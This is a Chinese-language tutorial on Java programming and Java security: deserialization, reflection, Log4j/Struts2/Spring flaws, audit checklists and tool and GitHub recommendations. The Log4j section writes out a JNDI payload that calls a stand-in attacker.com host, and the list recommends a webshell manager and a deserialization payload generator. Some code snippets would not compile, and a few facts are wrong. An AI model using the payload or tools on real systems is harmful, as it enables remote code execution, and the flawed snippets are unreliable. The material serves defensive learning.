# Java 编程基础与安全学习资源

> 本文系统介绍 Java 编程基础与企业级安全领域应用：Java 在安全中的定位、编程基础（安全视角）、Java 安全核心用法（反序列化、反射、框架漏洞、代码审计）、常用命令与工具、2026 年免费学习资源、推荐 GitHub 项目，以及两个可运行的示例程序（Basics.java 和 SecurityCases.java）。面向 Java 代码审计人员与企业安全工程师，全部内容从防御、漏洞分析和安全研究的正向角度出发。

---

## 目录

- [一、Java 在网络安全中的定位](#一java-在网络安全中的定位)
- [二、Java 编程基础（安全视角）](#二java-编程基础安全视角)
- [三、Java 安全核心用法](#三java-安全核心用法)
- [四、常用命令与工具](#四常用命令与工具)
- [五、2026 年免费学习资源](#五2026-年免费学习资源)
- [六、2026 年推荐 GitHub 项目](#六2026-年推荐-github-项目)
- [七、示例代码文件](#七示例代码文件)
- [附：Java 安全编码检查清单](#附java-安全编码检查清单)

---

## 一、Java 在网络安全中的定位

### 1.1 Java 与企业级安全

Java 是企业级应用开发的主流语言。从银行、电商、政务到大型互联网公司的后端系统，Java 占据了极其重要的地位。**正因为企业级应用广泛使用 Java，Java 安全也成为企业安全的核心领域之一**。

| 特点 | 说明 | 安全意义 |
|------|------|---------|
| **企业级应用广泛** | 银行、电商、政务、OA 等后端大量使用 | 漏洞影响面大，价值高 |
| **生态系统庞大** | Spring、Struts2、Log4j、Fastjson 等框架组件众多 | 第三方组件漏洞频发 |
| **强类型语言** | 编译时类型检查，相对更安全 | 比 PHP 少一些弱类型问题，但有自己的漏洞类型 |
| **JVM 平台** | 字节码、类加载、字节码增强等机制 | 有独特的攻击面（类加载、字节码操纵） |
| **反射机制** | 运行时动态加载类、调用方法 | 反序列化、表达式注入等漏洞的基础 |
| **历史包袱重** | 大量老系统使用旧版本 Java | 已知漏洞长期存在，难以修补 |

> **安全视角的重要性**：
> - 作为**代码审计工程师**：Java 企业应用是代码审计的常见目标，Spring Boot 等框架的安全配置、业务逻辑漏洞是重点
> - 作为**漏洞研究员**：Java 反序列化、表达式注入、模板注入是近年来的热门漏洞类型
> - 作为**企业安全工程师**：需要了解 Java 生态的安全风险，推动安全开发和组件治理
> - 作为**渗透测试工程师**：理解 Java 框架漏洞才能更好地进行渗透测试和漏洞利用

### 1.2 安全领域的应用方向

| 方向 | Java 的作用 | 典型场景 |
|------|------------|---------|
| **Java 代码审计** | 审计 Java Web 应用源码发现漏洞 | SQL 注入、XSS、越权、文件上传、反序列化 |
| **反序列化漏洞研究** | 研究 Java 反序列化原理和利用链 | Commons-Collections、Fastjson、Jackson |
| **框架漏洞分析** | 分析主流 Java 框架的安全问题 | Spring、Struts2、Log4j、Shiro |
| **企业安全开发** | 推动安全编码规范、安全左移 | 安全设计、代码审查、安全测试 |
| **Web 渗透测试** | Java 应用渗透测试 | 各类 Java Web 漏洞的发现和利用 |
| **组件安全治理** | 管理第三方依赖的安全风险 | Maven/Gradle 依赖审计、SCA 工具 |
| **移动安全** | Android 应用安全（Java/Kotlin） | APP 逆向、漏洞分析、加解密 |

### 1.3 Java 版本演进与安全变化

| 版本 | 时间 | 安全相关变化 |
|------|------|-------------|
| Java 6 | 2006 | 早期版本，大量遗留系统仍在使用 |
| Java 7 | 2011 | try-with-resources、Fork/Join 框架 |
| Java 8 | 2014 | Lambda、Stream、新日期 API（LTS，最广泛使用） |
| Java 9 | 2017 | 模块系统（JPMS）、G1 成为默认 GC |
| Java 11 | 2018 | LTS，移除 Java EE、新增 HttpClient |
| Java 17 | 2021 | LTS，密封类、模式匹配、增强伪随机数生成器 |
| Java 21 | 2023 | LTS，虚拟线程（Virtual Threads）、模式匹配 |
| Java 23 | 2025 | 最新版本，持续改进安全性和性能 |

> **注意**：企业中 Java 8 和 Java 17 仍是主流版本。Java 8 虽然已经 EOL，但大量遗留系统仍在使用。安全研究中经常需要考虑不同版本的差异（如某些反序列化利用链只在特定版本可用）。

---

## 二、Java 编程基础（安全视角）

### 2.1 环境搭建

#### JDK、JRE、JVM 的关系

```
JDK (Java Development Kit) = 开发工具包
├── JRE (Java Runtime Environment) = 运行时环境
│   └── JVM (Java Virtual Machine) = Java 虚拟机
├── 编译器 (javac)
├── 打包工具 (jar)
├── 文档工具 (javadoc)
└── 其他工具 (jdb, jstack, jmap, etc.)
```

| 组件 | 说明 | 是否必须 |
|------|------|---------|
| **JVM** | Java 虚拟机，执行字节码 | 运行 Java 程序必须 |
| **JRE** | JVM + 核心类库 | 运行 Java 程序必须 |
| **JDK** | JRE + 开发工具 | 开发 Java 程序必须 |

#### 常用 IDE

| IDE | 开发商 | 说明 |
|-----|--------|------|
| **IntelliJ IDEA** | JetBrains | 最流行的 Java IDE，功能强大（社区版免费） |
| **Eclipse** | Eclipse 基金会 | 开源免费，插件生态丰富 |
| **NetBeans** | Apache | 开源免费，轻量简洁 |
| **VS Code** | Microsoft | 轻量编辑器 + Java 插件 |

```bash
# 查看 Java 版本
java -version
javac -version

# 编译 Java 源文件
javac HelloWorld.java

# 运行编译后的类
java HelloWorld

# 打包为 jar
jar cvf app.jar *.class

# 运行 jar
java -jar app.jar
```

### 2.2 基础语法

```java
public class Basics {
    public static void main(String[] args) {
        // 变量声明：类型 变量名 = 值;
        int age = 25;
        String name = "Alice";
        double height = 1.68;
        boolean isStudent = true;

        // 基本数据类型（8 种）
        byte b = 127;        // 1 字节
        short s = 32767;     // 2 字节
        int i = 2147483647;  // 4 字节
        long l = 1234567890L; // 8 字节
        float f = 3.14f;     // 4 字节
        double d = 3.14159;  // 8 字节
        char c = 'A';        // 2 字节（Unicode）
        boolean bool = true; // 布尔值

        // 常量
        final int MAX_SIZE = 100;
        // MAX_SIZE = 200;  // 编译错误，不能修改

        // 运算符
        int a = 10, b = 3;
        a + b;    // 加法
        a - b;    // 减法
        a * b;    // 乘法
        a / b;    // 除法（整数除法结果是整数）
        a % b;    // 取余
        a++;      // 自增
        b--;      // 自减

        // 比较运算符（返回 boolean）
        a == b;   // 等于（基本类型比较值，对象比较引用）
        a != b;   // 不等于
        a > b;    // 大于
        a < b;    // 小于
        a >= b;   // 大于等于
        a <= b;   // 小于等于

        // 逻辑运算符
        true && false;  // 与
        true || false;  // 或
        !true;          // 非
    }
}
```

> **安全要点**：
> - Java 是强类型语言，编译时会检查类型，比 PHP/Python 少一些类型混淆问题
> - 但 `==` 比较对象时比较的是引用地址，不是内容！字符串比较要用 `equals()`
> - 经典坑：`Integer` 缓存（-128~127 缓存，范围内 `==` 成立，范围外不成立）

### 2.3 流程控制

```java
// if-else
int score = 85;
if (score >= 90) {
    System.out.println("优秀");
} else if (score >= 80) {
    System.out.println("良好");
} else if (score >= 60) {
    System.out.println("及格");
} else {
    System.out.println("不及格");
}

// switch（Java 7+ 支持字符串）
String day = "Monday";
switch (day) {
    case "Monday":
        System.out.println("星期一");
        break;  // 不要忘记 break！
    case "Friday":
        System.out.println("星期五");
        break;
    default:
        System.out.println("其他");
}

// switch 表达式（Java 14+）
int num = switch (day) {
    case "Monday" -> 1;
    case "Friday" -> 5;
    default -> 0;
};

// for 循环
for (int i = 0; i < 10; i++) {
    System.out.println(i);
}

// 增强 for 循环（遍历数组/集合）
int[] nums = {1, 2, 3, 4, 5};
for (int n : nums) {
    System.out.println(n);
}

// while 循环
int i = 0;
while (i < 10) {
    System.out.println(i);
    i++;
}

// do-while
int j = 0;
do {
    System.out.println(j);
    j++;
} while (j < 10);

// 三元运算符
String result = score >= 60 ? "及格" : "不及格";
```

### 2.4 面向对象

#### 类与对象

```java
// 类的定义
public class User {
    // 成员变量（字段）
    private String username;
    private String email;
    private int age;

    // 构造方法
    public User(String username, String email, int age) {
        this.username = username;
        this.email = email;
        this.age = age;
    }

    // 成员方法
    public String getUsername() {
        return username;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public int getAge() {
        return age;
    }

    public boolean isAdult() {
        return age >= 18;
    }

    // 静态方法（属于类，不属于对象）
    public static void printInfo() {
        System.out.println("这是 User 类");
    }
}

// 使用
User user = new User("alice", "alice@example.com", 25);
System.out.println(user.getUsername());  // alice
System.out.println(user.isAdult());      // true
User.printInfo();                        // 静态方法通过类调用
```

#### 封装、继承、多态

```java
// 继承
public class Admin extends User {
    private int level;

    public Admin(String username, String email, int age, int level) {
        super(username, email, age);  // 调用父类构造方法
        this.level = level;
    }

    // 方法重写（Override）
    @Override
    public boolean isAdult() {
        return super.isAdult() && level >= 1;
    }

    public void doAdminTask() {
        System.out.println("执行管理员任务");
    }
}

// 多态：父类引用指向子类对象
User user = new Admin("admin", "admin@example.com", 30, 2);
user.isAdult();  // 调用的是 Admin 的 isAdmin()（动态绑定）
// user.doAdminTask();  // 编译错误，User 类型没有这个方法
```

#### 接口

```java
public interface Shape {
    double getArea();       // 抽象方法
    double getPerimeter();

    default void printInfo() {  // 默认方法（Java 8+）
        System.out.println("这是一个图形");
    }
}

public class Circle implements Shape {
    private double radius;

    public Circle(double radius) {
        this.radius = radius;
    }

    @Override
    public double getArea() {
        return Math.PI * radius * radius;
    }

    @Override
    public double getPerimeter() {
        return 2 * Math.PI * radius;
    }
}
```

> **安全要点**：
> - 访问控制符的正确使用：`private` 限制字段访问，通过 getter/setter 控制
> - 继承和多态可能引入的安全问题（如方法重写改变行为）
> - 反射可以绕过访问控制，修改私有字段

### 2.5 集合框架

Java 集合框架是日常开发最常用的 API 之一。

```
Collection
├── List（有序，可重复）
│   ├── ArrayList       数组实现，随机访问快，增删慢
│   ├── LinkedList      链表实现，增删快，随机访问慢
│   └── Vector          线程安全（不推荐，性能差）
├── Set（无序，不可重复）
│   ├── HashSet         哈希表实现
│   ├── TreeSet         红黑树实现，有序
│   └── LinkedHashSet   哈希 + 链表，保持插入顺序
└── Map（键值对）
    ├── HashMap         哈希表实现
    ├── TreeMap         红黑树实现，键有序
    ├── LinkedHashMap   哈希 + 链表，保持插入顺序
    └── Hashtable       线程安全（不推荐）
```

```java
import java.util.*;

// List
List<String> list = new ArrayList<>();
list.add("apple");
list.add("banana");
list.get(0);          // 获取元素
list.size();          // 大小
list.contains("apple"); // 是否包含
list.remove(0);       // 删除元素

// 遍历
for (String fruit : list) {
    System.out.println(fruit);
}

// Set
Set<String> set = new HashSet<>();
set.add("a");
set.add("b");
set.add("a");  // 重复元素不会被添加
// set.size() == 2

// Map
Map<String, Integer> map = new HashMap<>();
map.put("Alice", 25);
map.put("Bob", 30);
map.get("Alice");     // 25
map.containsKey("Bob"); // true
map.remove("Alice");

// 遍历 Map
for (Map.Entry<String, Integer> entry : map.entrySet()) {
    String key = entry.getKey();
    Integer value = entry.getValue();
    System.out.println(key + ": " + value);
}

// Java 8+ Stream API
List<Integer> numbers = Arrays.asList(1, 2, 3, 4, 5, 6, 7, 8, 9, 10);
List<Integer> evens = numbers.stream()
    .filter(n -> n % 2 == 0)   // 过滤偶数
    .map(n -> n * 2)           // 每个乘 2
    .sorted()                   // 排序
    .collect(Collectors.toList());  // 收集为 List
```

> **安全要点**：
> - 集合的线程安全问题：ArrayList、HashMap 等不是线程安全的
> - `Arrays.asList()` 返回的是固定大小的列表，不能 add/remove
> - 集合中存储用户输入时要注意安全校验

### 2.6 异常处理

```java
// 异常体系
// Throwable
// ├── Error（严重错误，一般无法处理）
// │   ├── OutOfMemoryError
// │   └── StackOverflowError
// └── Exception（异常，可以处理）
//     ├── RuntimeException（运行时异常，非受检）
//     │   ├── NullPointerException
//     │   ├── IllegalArgumentException
//     │   ├── IndexOutOfBoundsException
//     │   └── ClassCastException
//     └── 受检异常（必须声明或捕获）
//         ├── IOException
//         ├── SQLException
//         └── 自定义异常

// try-catch-finally
try {
    int result = 10 / 0;  // 会抛出 ArithmeticException
} catch (ArithmeticException e) {
    System.out.println("算术异常: " + e.getMessage());
    e.printStackTrace();
} catch (Exception e) {
    System.out.println("其他异常: " + e.getMessage());
} finally {
    System.out.println("无论是否发生异常，这里都会执行");
    // 通常用来释放资源（关闭文件、数据库连接等）
}

// try-with-resources（Java 7+，自动关闭资源）
try (BufferedReader reader = new BufferedReader(new FileReader("file.txt"))) {
    String line = reader.readLine();
    // 使用资源
} catch (IOException e) {
    // 处理异常
}  // 自动调用 reader.close()

// 自定义异常
public class SecurityException extends RuntimeException {
    public SecurityException(String message) {
        super(message);
    }
}

// 抛出异常
public void checkPermission(String role) {
    if (!"admin".equals(role)) {
        throw new SecurityException("权限不足");
    }
}
```

> **安全要点**：
> - 不要在异常信息中泄露敏感信息（数据库连接、堆栈跟踪等）
> - 生产环境不要直接输出 `e.printStackTrace()`
> - 资源要在 finally 或 try-with-resources 中释放
> - 不要捕获 `Throwable` 或 `Exception` 然后什么都不做（吞异常）

### 2.7 I/O 与文件操作

```java
import java.io.*;
import java.nio.file.*;
import java.util.List;

// 读取文件（老方式）
BufferedReader br = new BufferedReader(new FileReader("file.txt"));
String line;
while ((line = br.readLine()) != null) {
    System.out.println(line);
}
br.close();

// 读取文件（try-with-resources，推荐）
try (BufferedReader reader = new BufferedReader(new FileReader("file.txt"))) {
    String l;
    while ((l = reader.readLine()) != null) {
        System.out.println(l);
    }
} catch (IOException e) {
    e.printStackTrace();
}

// NIO.2 方式（Java 7+，更简洁）
Path path = Paths.get("file.txt");
List<String> lines = Files.readAllLines(path);
for (String l : lines) {
    System.out.println(l);
}

// 写入文件
Files.write(path, "Hello, Java!".getBytes());
Files.write(path, Arrays.asList("line1", "line2"), StandardOpenOption.APPEND);

// 文件检查
Files.exists(path);
Files.isRegularFile(path);
Files.isDirectory(path);
Files.isReadable(path);
Files.isWritable(path);
Files.size(path);

// 目录操作
Files.createDirectory(Paths.get("new_dir"));
DirectoryStream<Path> stream = Files.newDirectoryStream(Paths.get("."));
for (Path p : stream) {
    System.out.println(p.getFileName());
}
```

### 2.8 多线程与并发

```java
// 方式 1：继承 Thread 类
class MyThread extends Thread {
    @Override
    public void run() {
        System.out.println("线程运行中");
    }
}
new MyThread().start();

// 方式 2：实现 Runnable 接口
class MyRunnable implements Runnable {
    @Override
    public void run() {
        System.out.println("线程运行中");
    }
}
new Thread(new MyRunnable()).start();

// 方式 3：Lambda（Java 8+）
new Thread(() -> System.out.println("线程运行中")).start();

// 线程池（推荐，性能更好）
ExecutorService executor = Executors.newFixedThreadPool(10);
executor.submit(() -> {
    System.out.println("线程池任务");
});
executor.shutdown();

// 同步 synchronized
class Counter {
    private int count = 0;

    public synchronized void increment() {  // 同步方法
        count++;
    }

    public int getCount() {
        return count;
    }
}

// ReentrantLock
Lock lock = new ReentrantLock();
lock.lock();
try {
    // 临界区代码
} finally {
    lock.unlock();  // 必须在 finally 中释放
}

// 线程安全的集合
List<String> safeList = Collections.synchronizedList(new ArrayList<>());
Map<String, String> concurrentMap = new ConcurrentHashMap<>();
```

> **安全要点**：
> - 并发安全问题：竞态条件、死锁、活锁
> - 单例模式的线程安全实现（双重检查锁定、枚举单例）
> - ThreadLocal 可能导致内存泄漏和安全问题
> - 线程池的正确关闭

---

## 三、Java 安全核心用法

### 3.1 常见 Java Web 漏洞类型

| 漏洞类型 | 严重程度 | 典型场景 | 防御方法 |
|---------|---------|---------|---------|
| **SQL 注入** | 🔴 极高 | 拼接 SQL 语句 | PreparedStatement 参数化查询 |
| **XSS** | 🔴 高 | 输出未转义 | 输出编码、CSP |
| **反序列化** | 🔴 极高 | 反序列化不可信数据 | 禁止反序列化用户输入、白名单类 |
| **表达式注入** | 🔴 极高 | SpEL/OGNL 表达式可控 | 禁止用户控制表达式 |
| **SSRF** | 🟠 高 | 请求地址用户可控 | 协议白名单、内网地址限制 |
| **越权访问** | 🟠 高 | 权限校验不严 | 统一权限框架、接口鉴权 |
| **文件上传** | 🔴 高 | 上传校验不严 | 白名单、重命名、随机路径 |
| **命令注入** | 🔴 极高 | Runtime.exec 参数可控 | 避免执行系统命令、参数校验 |
| **模板注入** | 🔴 高 | 模板内容用户可控 | 禁止用户控制模板内容 |
| **XXE** | 🟠 中 | XML 解析未禁用外部实体 | 禁用外部实体 |

### 3.2 反序列化漏洞（Java 特色漏洞）

#### 原理

Java 序列化是将对象转换为字节流的过程，反序列化则是将字节流恢复为对象。当应用反序列化**用户可控**的数据流时，攻击者可以构造恶意的序列化数据，利用已有的类（Gadget）中的危险方法调用链，实现任意代码执行。

```
攻击者构造恶意序列化数据 → 应用反序列化 → 实例化恶意对象
→ 对象的 readObject()/readResolve()/finalize() 等方法被自动调用
→ 通过 Gadget 链调用危险方法 → 远程代码执行 (RCE)
```

#### 常见 Gadget 链（利用链）

| 库 | 链名 | 说明 |
|----|------|------|
| Apache Commons Collections | CC1~CC10 | 最经典的反序列化利用链 |
| JDK 原生 | Jdk7u21 / Jdk8u20 | JDK 自带类的利用链 |
| Fastjson | Fastjson 反序列化 | 阿里 Fastjson 的漏洞 |
| Jackson | Jackson 反序列化 | Jackson 多态反序列化漏洞 |
| XStream | XStream 反序列化 | XML 反序列化漏洞 |
| Log4j | Log4j2 JNDI | Log4j2 的 JNDI 注入漏洞 |
| Spring | Spring 反序列化 | Spring 相关利用链 |

#### 防御方法

```java
// ❌ 危险：直接反序列化用户输入
// ObjectInputStream ois = new ObjectInputStream(inputStream);
// Object obj = ois.readObject();  // 用户可控 → RCE！

// ✅ 防御 1：完全避免 Java 原生序列化
// 使用 JSON 替代
ObjectMapper mapper = new ObjectMapper();
MyObject obj = mapper.readValue(jsonString, MyObject.class);
// JSON 只能解析数据，不会执行任意代码

// ✅ 防御 2：如果必须使用，实现白名单类校验
class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.example.User",
        "com.example.Product"
    );

    public SafeObjectInputStream(InputStream in) throws IOException {
        super(in);
    }

    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc)
            throws IOException, ClassNotFoundException {
        if (!ALLOWED_CLASSES.contains(desc.getName())) {
            throw new SecurityException(
                "不允许反序列化类: " + desc.getName()
            );
        }
        return super.resolveClass(desc);
    }
}

// ✅ 防御 3：配置 JVM 全局反序列化过滤（Java 9+ 内置）
// -Djdk.serialFilter=com.example.*;!*
// 只允许 com.example 包下的类，其他全部拒绝

// ✅ 防御 4：使用 ValidatingObjectInputStream（Apache Commons IO）
// ValidatingObjectInputStream ois = new ValidatingObjectInputStream(in);
// ois.accept(User.class, Product.class);  // 只接受这些类
// Object obj = ois.readObject();
```

#### Look-ahead Object Validation 模式

```java
// 在反序列化之前先检查类名（部分防御）
public static Object safeDeserialize(byte[] data) throws Exception {
    // 先解析序列化头部，检查类名是否在白名单中
    // 这是一种 look-ahead 模式
    try (ObjectInputStream ois = new LookAheadObjectInputStream(
            new ByteArrayInputStream(data))) {
        return ois.readObject();
    }
}
```

> **重要**：反序列化漏洞是 Java 安全中最经典也是最复杂的领域。防御的最佳实践是**尽量不要使用 Java 原生序列化**，改用 JSON、Protocol Buffers 等安全的数据交换格式。

### 3.3 Java 反射机制与安全风险

#### 反射基础

```java
// 获取 Class 对象
Class<?> clazz = Class.forName("java.lang.String");
Class<?> clazz2 = String.class;
Class<?> clazz3 = "hello".getClass();

// 创建对象
Object obj = clazz.getDeclaredConstructor().newInstance();

// 调用方法
Method method = clazz.getMethod("length");
int length = (int) method.invoke("hello");  // 5

// 访问字段
Field field = clazz.getDeclaredField("value");
field.setAccessible(true);  // 绕过访问控制！
char[] value = (char[]) field.get("hello");
```

#### 安全风险

| 风险 | 说明 |
|------|------|
| **绕过访问控制** | `setAccessible(true)` 可以访问私有字段和方法 |
| **动态加载类** | `Class.forName()` 可以动态加载任意类 |
| **任意方法调用** | 通过反射可以调用任意方法 |
| **修改常量** | 反射可以修改 final 字段 |
| **权限绕过** | 反射可以修改权限相关的字段 |

> **防御**：
> - 不要反射调用用户可控的类名和方法名
> - 安装 SecurityManager（Java 17 已废弃）
> - 限制类加载器的权限
> - 代码审计中关注反射相关的调用

### 3.4 常见框架漏洞

#### Spring 框架

| 漏洞类型 | 说明 | 典型案例 |
|---------|------|---------|
| **SpEL 表达式注入** | Spring Expression Language 注入 | CVE-2022-22965 (Spring4Shell) |
| **SSRF** | RestTemplate、WebClient 地址可控 | Spring Cloud 网关 SSRF |
| **文件上传** | MultipartFile 处理不当 | 各种 Spring MVC 上传漏洞 |
| **越权** | 权限配置不当，接口未鉴权 | 常见业务逻辑漏洞 |
| **Actuator 泄露** | 端点未授权访问，泄露敏感信息 | /actuator/env 等 |

#### Struts2

Struts2 是历史上漏洞最多的 Java 框架之一，以 OGNL 表达式注入著称。

| 漏洞编号 | 类型 | 影响 |
|---------|------|------|
| S2-001 | OGNL 注入 | 远程代码执行 |
| S2-005 | OGNL 注入 | 远程代码执行 |
| S2-008 | 远程命令执行 | DevMode 远程代码执行 |
| S2-016 | OGNL 注入 | 默认配置 RCE |
| S2-032 | 方法调用 | 远程代码执行 |
| S2-045 | OGNL 注入 | Content-Type 头 RCE |
| S2-057 | OGNL 注入 | 命名空间 RCE |

> **Struts2 漏洞防御**：升级到最新版本、关闭 DMI（动态方法调用）、配置 OGNL 安全限制、使用安全框架替代

#### Log4j2

| 漏洞 | CVE | 说明 |
|------|-----|------|
| **Log4Shell** | CVE-2021-44228 | JNDI 注入导致 RCE，影响面极广 |
| 其他相关 | CVE-2021-45046 / 45105 | 绕过和 DoS |

```java
// 漏洞原理：Log4j2 的 Lookup 机制
// 当日志中包含 ${jndi:ldap://attacker.com/Exploit} 时
// Log4j2 会发起 JNDI 请求，加载远程恶意类
logger.error("用户登录: " + userInput);  // userInput 可控 → RCE！

// 防御
// 1. 升级 Log4j2 到 2.17.1+
// 2. 设置系统属性：-Dlog4j2.formatMsgNoLookups=true
// 3. 移除 JndiLookup 类
// 4. 限制出网（JNDI 需要连接恶意服务器）
```

### 3.5 代码审计要点

#### 危险方法识别

| 类别 | 危险方法 | 风险 |
|------|---------|------|
| **命令执行** | `Runtime.exec()`、`ProcessBuilder` | 命令注入 |
| **反序列化** | `ObjectInputStream.readObject()` | 反序列化 RCE |
| **反射** | `Class.forName()`、`Method.invoke()` | 任意类加载、方法调用 |
| **SQL** | `Statement.execute()`、字符串拼接 SQL | SQL 注入 |
| **文件操作** | `FileInputStream`、路径拼接 | 任意文件读取/写入 |
| **表达式** | `SpelExpressionParser`、`OGNL` | 表达式注入 |
| **XML 解析** | `SAXParser`、`DocumentBuilder` | XXE |
| **JNI** | `System.load()`、`System.loadLibrary()` | 加载本地库 |
| **类加载** | `URLClassLoader`、`defineClass` | 加载恶意类 |

#### 输入验证检查点

- [ ] 所有外部输入是否经过验证（HTTP 参数、Header、Cookie、文件上传）
- [ ] 使用白名单验证，而非黑名单
- [ ] 验证数据类型、长度、范围、格式
- [ ] 数据库查询使用参数化查询
- [ ] 输出到 HTML 时进行 HTML 转义
- [ ] 文件上传有完整的校验流程

#### 安全编码规范

| 规范 | 说明 |
|------|------|
| **输入验证** | 不信任任何外部输入，白名单校验 |
| **输出编码** | 根据输出上下文进行适当编码 |
| **参数化查询** | 永远使用 PreparedStatement |
| **最小权限** | 数据库账号、系统权限最小化 |
| **错误处理** | 不向用户暴露详细错误信息 |
| **敏感数据保护** | 密码哈希、敏感数据加密 |
| **安全依赖管理** | 定期更新依赖，检查已知漏洞 |
| **安全审计** | 代码审查、静态分析、渗透测试 |

---

## 四、常用命令与工具

### 4.1 编译与运行

| 命令 | 说明 | 示例 |
|------|------|------|
| `javac` | 编译 Java 源文件 | `javac Hello.java` |
| `java` | 运行 Java 程序 | `java Hello` |
| `jar` | 打包/解包 jar 文件 | `jar cvf app.jar *.class` |
| `javadoc` | 生成 API 文档 | `javadoc -d doc src/` |
| `javap` | 反汇编字节码 | `javap -c Hello.class` |
| `jdeps` | 依赖分析 | `jdeps app.jar` |

```bash
# 编译单个文件
javac HelloWorld.java

# 编译多个文件，指定输出目录
javac -d out src/*.java

# 运行
java -cp out HelloWorld

# 运行 jar
java -jar app.jar

# 指定 JVM 参数
java -Xmx512m -Xms256m -jar app.jar
# -Xmx: 最大堆内存
# -Xms: 初始堆内存

# 查看字节码
javap -c -p HelloWorld.class
```

### 4.2 依赖管理

| 工具 | 说明 | 配置文件 |
|------|------|---------|
| **Maven** | 最流行的 Java 构建工具 | `pom.xml` |
| **Gradle** | 更灵活的构建工具（Groovy/Kotlin DSL） | `build.gradle` |

```xml
<!-- Maven pom.xml 示例 -->
<project>
    <modelVersion>4.0.0</modelVersion>
    <groupId>com.example</groupId>
    <artifactId>myapp</artifactId>
    <version>1.0.0</version>

    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
            <version>3.2.0</version>
        </dependency>
    </dependencies>
</project>
```

```bash
# Maven 常用命令
mvn clean compile      # 清理并编译
mvn clean package      # 打包
mvn clean install      # 安装到本地仓库
mvn dependency:tree    # 查看依赖树
mvn dependency:check   # 检查依赖（需要插件）
```

### 4.3 反编译工具

| 工具 | 说明 | 类型 |
|------|------|------|
| **JD-GUI** | 经典 Java 反编译工具，图形界面 | 桌面应用 |
| **CFR** | 功能强大的反编译器，支持 Java 8+ 特性 | 命令行 |
| **Procyon** | 另一个优秀的反编译器 | 命令行 |
| **Bytecode Viewer** | 集成多个反编译器的 GUI 工具 | 桌面应用 |
| **JADX** | Android APK 反编译，也可反编译 jar | GUI + 命令行 |
| **javap** | JDK 自带的字节码反汇编 | 命令行 |

```bash
# CFR 反编译
java -jar cfr.jar app.jar --outputdir src_decompiled

# javap 查看字节码
javap -c -p -v HelloWorld.class
```

### 4.4 安全审计工具

| 工具 | 用途 | 说明 |
|------|------|------|
| **SpotBugs** | 静态代码分析 | FindBugs 的继任者，查找代码缺陷 |
| **Find Security Bugs** | 安全规则集 | SpotBugs 的安全检测插件，100+ 安全规则 |
| **Semgrep** | 静态分析 | 支持 Java，有丰富的安全规则 |
| **SonarQube** | 代码质量平台 | 集成多种分析，包括安全规则 |
| **OWASP Dependency-Check** | 依赖漏洞检测 | 扫描第三方依赖的 CVE |
| **Snyk** | 依赖安全 | 商业工具，有免费版 |
| **Trivy** | 漏洞扫描 | 开源，支持镜像、文件系统、依赖 |

```bash
# SpotBugs + Find Security Bugs
# Maven 插件配置后
mvn spotbugs:check

# OWASP Dependency-Check
dependency-check --project MyApp --scan .
```

### 4.5 JVM 诊断工具

| 工具 | 用途 | 说明 |
|------|------|------|
| **jstack** | 线程堆栈分析 | 查看线程状态、死锁 |
| **jmap** | 内存分析 | 生成堆转储、查看堆信息 |
| **jstat** | JVM 统计 | GC、类加载等统计信息 |
| **jhat** | 堆分析 | 分析堆转储文件 |
| **VisualVM** | 可视化监控 | 集成多种 JVM 诊断工具 |
| **MAT** | 内存分析工具 | Eclipse Memory Analyzer |
| **Arthas** | Java 诊断工具 | Alibaba 开源，功能强大 |

---

## 五、2026 年免费学习资源

| 资源 | 类型 | 说明 | 链接/获取方式 |
|------|------|------|--------------|
| **国家高等教育智慧教育平台 Java 课程** | 在线课程 | Java 程序设计课程，国内知名高校出品 | 智慧教育平台搜索 "Java程序设计" |
| **javaistic/javaistic** | 在线学习网站 | 免费开源的 Java 学习网站，从基础到高级 | GitHub 搜索 javaistic |
| **phitronio/Java-playlist** | 课程材料 | 面向大学/文凭学生的 Java 课程材料与代码示例 | GitHub 搜索 Java-playlist |
| **Oracle 官方 Java 教程** | 官方文档 | Oracle 官方的 Java 教程，最权威 | [docs.oracle.com](https://docs.oracle.com/javase/tutorial/) |
| **w3schools Java Tutorial** | 入门教程 | 经典入门教程，有在线编辑器 | [w3schools.com/java](https://www.w3schools.com/java/) |
| **GeeksforGeeks Java** | 教程+练习 | 大量 Java 教程和算法练习 | [geeksforgeeks.org/java](https://www.geeksforgeeks.org/java/) |
| **Java 官方文档** | API 参考 | Java SE API 文档 | [docs.oracle.com/en/java/javase](https://docs.oracle.com/en/java/javase/) |
| **OWASP Java 安全速查表** | 安全参考 | Java 安全编码最佳实践 | OWASP 官网 |

> **2026 年时效性标注**：Java 版本更新较快（每 6 个月一个版本，每 2-3 年一个 LTS），但基础语法和核心概念长期稳定。安全方面，新的漏洞类型和利用链不断出现，建议持续关注安全公告和 CVE。Java 17 和 Java 21 是当前主流 LTS 版本。

---

## 六、2026 年推荐 GitHub 项目

| 项目 | Stars（约） | 说明 | 适用场景 |
|------|------------|------|---------|
| **XiaomingX/JSEF** | 数百+ | Java Security Education Framework，基于 Spring Boot 3.x，含 35+ 种真实业务场景安全漏洞实例（注入攻击、越权访问、敏感信息泄露等），提供"原理讲解→漏洞复现→代码对比→修复验证"完整学习闭环 | Java 安全学习、漏洞演练 |
| **Erosion2020/JavaSec** | 数百+ | 零基础 Java 安全学习笔记 | Java 安全入门、知识体系 |
| **gb233/JavaWebSec** | 数千+ | 以 OWASP Top 10 为基础的 Web 安全教学平台，支持"漏洞演示→修复对比→知识测试→挑战模式" | Web 安全教学、OWASP 学习 |
| **find-sec-bugs/find-sec-bugs** | 数千+ | SpotBugs 的安全检测插件，100+ 安全规则 | 代码审计、静态分析 |
| **jeremylong/DependencyCheck** | 数千+ | OWASP 官方的依赖漏洞检测工具 | 依赖安全审计 |
| **alibaba/arthas** | 数万+ | Alibaba 开源的 Java 诊断工具 | JVM 诊断、线上调试 |
| **NationalSecurityAgency/ghidra** | 数万+ | NSA 开源的逆向工程套件（支持 Java 字节码） | 逆向分析、代码审计 |
| **rebeyond/Behinder** | 数千级 | 冰蝎 - Java 动态二进制加密 WebShell 管理工具（学习研究用） | WebShell 研究（注意授权） |
| **frohoff/ysoserial** | 数千+ | Java 反序列化 Payload 生成工具 | 反序列化漏洞研究（学习用） |

> **⚠️ 免责声明**：以上 GitHub 项目仅供学习研究使用。漏洞利用相关内容**仅限在完全授权的测试环境中使用**。未经授权对任何系统进行测试可能违反法律。学习者应重点关注漏洞原理和防御方法，以及如何编写安全的代码。

---

## 七、示例代码文件

